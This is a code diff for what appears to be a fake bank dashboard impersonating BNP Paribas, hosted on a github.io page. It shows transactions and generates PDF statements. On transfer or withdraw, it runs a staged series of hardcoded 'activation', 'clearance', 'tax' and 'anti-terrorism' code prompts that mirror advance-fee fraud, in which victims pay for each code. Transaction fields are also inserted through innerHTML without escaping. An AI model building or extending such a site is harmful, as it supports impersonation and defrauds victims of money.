@@ -940,4 +940,270 @@ async function loadUserBasicInfo() {
     }
 
     if (data) {
-      console.log("Basic user
+      console.log("Basic user info received:", data);
+
+      // 🧑 Full Name
+      const nameEl = document.getElementById("profileName");
+      if (nameEl) nameEl.textContent = `${data.first_name} ${data.last_name}`;
+
+      // 🔢 Account Number
+      const acctEl = document.getElementById("accountNumber");
+      if (acctEl) acctEl.textContent = data.account_number;
+    } else {
+      alert("User not found.");
+    }
+  } catch (err) {
+    console.error("Unexpected Error:", err);
+    alert("An error occurred while loading user info.");
+  }
+}
+
+  async function loadTransactions() {
+    const { data, error } = await supabaseClient
+      .from('transactions')
+      .select('*')
+      .eq('user_id', userId)
+      .order('created_at', { ascending: false });
+
+    const tbody = document.getElementById("transactionTableBody");
+    tbody.innerHTML = '';
+
+    if (!data || data.length === 0) {
+      tbody.innerHTML = `<tr><td colspan="4">No transactions found.</td></tr>`;
+      return;
+    }
+data.forEach(tx => {
+      const row = document.createElement('tr');
+      
+      row.innerHTML = `
+  <td>${new Date(tx.created_at).toLocaleString()}</td>
+  <td>${tx.type}</td>
+  <td>$${parseFloat(tx.amount).toFixed(2)}</td>
+  <td>${tx.description || '-'}</td>
+  <td>${tx.sender_name || '-'}</td>
+  <td>${tx.bank_name || '-'}</td>
+  <td>${tx.sender_account_number || '-'}</td>
+  <td>${tx.transaction_type || '-'}</td>
+  <td>${tx.swift_code || '-'}</td>
+  <td>${tx.transaction_ref || '-'}</td>
+`;
+  
+      tbody.appendChild(row);
+    });
+  } 
+    
+  
+  
+</script>
+<script>
+	
+  async function downloadStatement() {
+    const accountData = await supabaseClient
+      .from('users')
+      .select('*')
+      .eq('id', userId)
+      .single();
+
+    const transactionsData = await supabaseClient
+      .from('transactions')
+      .select('*')
+      .eq('user_id', userId)
+      .order('created_at', { ascending: false });
+
+    const { jsPDF } = window.jspdf;
+    const doc = new jsPDF();
+
+    let y = 10;
+
+    // Header
+    doc.setFontSize(16);
+    doc.text("Statement of Account", 10, y);
+    y += 10;
+
+    doc.setFontSize(12);
+    doc.text(`Name: ${accountData.data?.name || 'N/A'}`, 10, y); y += 7;
+    doc.text(`Email: ${accountData.data?.email || 'N/A'}`, 10, y); y += 7;
+    doc.text(`Balance: $${(accountData.data?.balance || 0).toFixed(2)}`, 10, y); y += 7;
+    doc.text(`Status: ${accountData.data?.status || 'N/A'}`, 10, y); y += 15;
+
+    doc.setFontSize(14);
+    doc.text("Transactions:", 10, y);
+    y += 10;
+
+    if (!transactionsData.data || transactionsData.data.length === 0) {
+      doc.setFontSize(12);
+      doc.text("No transactions found.", 10, y);
+    } else {
+      doc.setFontSize(10);
+
+      transactionsData.data.forEach(tx => {
+        if (y > 260) {
+          doc.addPage();
+          y = 10;
+        }
+
+        const dateStr = new Date(tx.created_at).toLocaleString();
+        const amountStr = `$${parseFloat(tx.amount).toFixed(2)}`;
+
+        // First row
+        doc.text(`Date: ${dateStr}`, 10, y);
+        doc.text(`Type: ${tx.type || '-'}`, 80, y);
+        doc.text(`Amount: ${amountStr}`, 140, y);
+        y += 6;
+
+        // Description (wrapped)
+        const descText = doc.splitTextToSize(`Desc: ${tx.description || '-'}`, 180);
+        doc.text(descText, 10, y);
+        y += descText.length * 5;
+
+        // Sender name & Bankp
+        doc.text(`Sender: ${tx.sender_name || '-'}`, 10, y);
+        doc.text(`Bank: ${tx.bank_name || '-'}`, 80, y);
+        y += 6;
+
+        // Account & Transaction Type
+        doc.text(`Acct #: ${tx.sender_account_number || '-'}`, 10, y);
+        doc.text(`Txn Type: ${tx.transaction_type || '-'}`, 80, y);
+        y += 6;
+
+        // SWIFT & Ref
+        doc.text(`SWIFT: ${tx.swift_code || '-'}`, 10, y);
+        doc.text(`Txn Ref: ${tx.transaction_ref || '-'}`, 80, y);
+        y += 10; // space before next transaction
+      });
+    }
+
+    doc.save("statement_of_account.pdf");
+  }
+ // Call the function once DOM is ready
+</script>
+<script>
+  const modalOverlay = document.getElementById('modalOverlay');
+  const modalTitle = document.getElementById('modalTitle');
+  const codeInput = document.getElementById('codeInput');
+  const submitAction = document.getElementById('submitAction');
+
+  let currentAction = '';
+  const codes = {
+    transfer: 'ACT1234',
+    withdraw: 'COT5678',
+    payments: 'CLF9999'
+  };
+
+  const redirectURL = 'https://bnp-paribas-banking.github.io/BNP-PARISBAS-BANKING/tax_clearance.html'; // Change as needed
+
+  function openModal(actionType) {
+    modalOverlay.style.display = 'flex';
+    currentAction = actionType;
+    codeInput.value = '';
+
+    switch (actionType) {
+      case 'transfer':
+        modalTitle.textContent = 'Transfer Funds';
+        codeInput.placeholder = 'Enter Amount';
+        break;
+      case 'withdraw':
+        modalTitle.textContent = 'Withdraw Funds';
+        codeInput.placeholder = 'Enter Amount';
+        break;
+      case 'payments':
+        modalTitle.textContent = 'Payment Request';
+        codeInput.placeholder = 'Enter Amount';
+        break;
+    }
+  }
+
+  document.getElementById('transferButton').addEventListener('click', () => openModal('transfer'));
+  document.getElementById('withdrawButton').addEventListener('click', () => openModal('withdraw'));
+  document.querySelector('.action-button:nth-child(3)').addEventListener('click', () => openModal('payments'));
+  
+  
+  
+
+  submitAction.addEventListener('click', async () => {
+  const modal = document.getElementById('modal');
+  const modalContent = document.getElementById('modalContent');
+
+  const codes = {
+    activation: "ACT1234",
+    transfer: "COT5678",
+    clearance: "CLF9999",
+    tax: "TCX-PARIBAS-2024",
+    anti: "ATFCX-BNP-2024"
+  };
+
+  const redirectURL = " https://bnp-paribas-banking.github.io/BNP-PARISBAS-BANKING"; // Replace with actual URL
+
+  function showModal(content) {
+    modalContent.innerHTML = content;
+    modal.classList.add('active');
+  }
+
+  function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+
+  async function requestCode(codeKey, message, nextStep) {
+    showModal(`<div class="spinner"></div><p>${message}</p>`);
+    await delay(3000);
+
+    showModal(`
+      <h3>Bank Verification</h3>
+      <p>${message}</p>
+      <input type="text" id="${codeKey}Input" placeholder="Enter ${codeKey} code" />
+      <button id="submit${codeKey}">Submit</button>
+    `);
+
+    return new Promise(resolve => {
+      document.getElementById(`submit${codeKey}`).addEventListener('click', async () => {
+        const value = document.getElementById(`${codeKey}Input`).value.trim();
+        if (value === codes[codeKey]) {
+          showModal(`<div class="spinner"></div><p>Processing...</p>`);
+          await delay(5000);
+          resolve(true);
+        } else {
+          alert('Incorrect code. Please contact bank support.');
+          resolve(false);
+        }
+      });
+    });
+  }
+
+function hideModal() {
+  document.getElementById('modal').classList.remove('active');
+}
+  // 🔁 Begin Steps
+  const step1 = await requestCode('activation', 'Please enter your activation code to begin your transaction.');
+  if (!step1) return;
+
+  const step2 = await requestCode('transfer', 'Enter the transfer code to continue.');
+  if (!step2) return;
+
+  const step3 = await requestCode('clearance', 'Enter the clearance code to proceed.');
+  if (!step3) return;
+
+  const step4 = await requestCode('tax', 'Enter the tax clearance code to continue.');
+  if (!step4) return;
+
+  const step5 = await requestCode('anti', 'Enter anti-terrorism clearance code.');
+  if (!step5) return;
+
+  showModal(`
+    <h3>✅ Transaction Complete</h3>
+    <p>Your transaction has been verified and approved.</p>
+  `);
+  await delay(3000);
+  window.location.href = redirectURL;
+});
+
+  // Close modal on outside click
+  modalOverlay.addEventListener('click', e => {
+    if (e.target === modalOverlay) {
+      modalOverlay.style.display = 'none';
+    }
+  });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+</body>
+</html>
